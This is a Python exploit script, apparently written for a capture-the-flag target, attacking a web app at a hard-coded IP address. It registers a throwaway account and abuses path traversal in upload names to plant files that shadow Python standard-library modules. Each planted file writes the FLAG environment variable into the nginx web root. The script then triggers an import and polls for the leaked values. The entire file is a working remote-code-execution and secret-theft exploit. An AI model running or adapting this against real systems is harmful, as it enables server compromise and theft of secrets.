import sys, io, zipfile, requests, time, random
sys.path.insert(0, ".")
import palforge as pf
BASE="http://144.79.188.39:36534"; pf.BASE=BASE
def fresh():
    u="u%d"%random.randint(10000,99999); pw="pass12345"
    requests.post(f"{BASE}/api/auth/register/", json={"username":u,"password":pw,"full_name":"z"}, timeout=15)
    return pf.login(u,pw), u
# plant a set of modules, then request with Accept: text/html
tok,u=fresh()
mods=["webbrowser","html","html.parser","urllib.request","urllib.parse","email.parser","http.client","posixpath","ntpath","pathlib"]
files={}
for m in mods:
    fn = m.replace(".","/")+".py"
    mk = "wb_"+m.replace(".","_")
    files[fn]=f'import os\nopen("/usr/share/nginx/html/{mk}","w").write(os.environ.get("FLAG","NOFLAG"))\n'.encode()
pid=pf.create_platform(tok,"lib/python3.11",name="z"); mid=pf.create_mod(tok,"../../../usr/local",title="z"); bid=pf.create_build(tok,mid,pid)
r=pf.upload_zip(tok,mid,bid,files)
print("plant ->",r.status_code,r.text[:60])
h={"Authorization":f"Bearer {tok}","Accept":"text/html"}
try:
    resp=requests.get(f"{BASE}/api/mods/",headers=h,timeout=15)
    print("Accept html ->",resp.status_code)
except Exception as e:
    print("req err",repr(e)[:80])
time.sleep(1)
for m in mods:
    mk="wb_"+m.replace(".","_")
    c=requests.get(f"{BASE}/{mk}",timeout=6)
    if c.status_code==200 and "doctype" not in c.text[:40].lower():
        print("FIRED",mk,repr(c.text[:50]))
print("done")
